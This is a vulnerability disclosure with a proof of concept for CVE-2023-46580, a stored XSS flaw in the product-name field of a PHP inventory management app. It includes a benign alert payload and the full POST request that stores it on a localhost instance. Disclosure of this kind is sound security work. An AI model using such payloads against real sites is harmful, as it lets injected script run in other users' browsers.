# CVE-2023-46580-Code-Projects-Inventory-Management-1.0-Stored-Cross-Site-Scripting-Vulnerability
+ Exploit Author: ersinerenler
# Vendor Homepage
+ https://code-projects.org/inventory-management-in-php-with-source-code
# Software Link
+ https://download-media.code-projects.org/2021/05/Inventory_Management_In_PHP_With_Source_Code.zip
# Overview
+ Code-Projects Inventory Management V1.0 is susceptible to a critical security vulnerability involving Stored Cross-Site Scripting (XSS) through 'pname' parameter in the /editProduct.php file. The application fails to adequately sanitize user-supplied data, allowing attackers to inject malicious scripts into the application. This could lead to the execution of arbitrary script code in the browsers of unsuspecting users, potentially compromising their security and privacy within the context of the affected site.
# Vulnerability Details
+ CVE ID: CVE-2023-46580
+ Affected Version: Inventory Management V1.0
+ Vulnerable File: editProduct.php
+ Parameters: pname
# References:
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46580
+ https://nvd.nist.gov/vuln/detail/CVE-2023-46580
# Description
+ The parameter pname in the /editProduct.php file of Code-Projects Inventory Management V1.0 are susceptible to Stored Cross-Site Scripting (XSS). This vulnerability arises due to insufficient input validation and sanitation of user-supplied data. An attacker can exploit this weakness by injecting malicious scripts into these parameters, which, when stored on the server, may be executed when other users view the affected user's profile.
# Proof of Concept (PoC) : 
+ Register and login the panel
+ Go to Products --> Edit Product
+ Click Submit
+ Intercept the POST request to editProduct.php via Burp Suite
+ Inject the payload to the vulnerable parameter
+ Payload: `"><svg/onload=alert(document.domain)>`
+ Example request for `pname` parameter
```
POST /Inventory-Management/model/editProduct.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://localhost
Connection: close
Referer: http://localhost/Inventory-Management/model/editProduct.php?id=12
Cookie: PHPSESSID=<some-cookie-value>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

pname=AloeVera+Gel"><svg/onload=alert(document.domain)>&buy=56&sell=14&id=12&Submit=Submit
```
+ Go to the Products page and trigger the XSS --> http://localhost/Inventory-Management/model/product.php
<img width="1447" alt="image" src="https://github.com/ersinerenler/Code-Projects-Inventory-Management-1.0/assets/113091631/e57d7def-e5b7-425d-a329-33c84090927c">
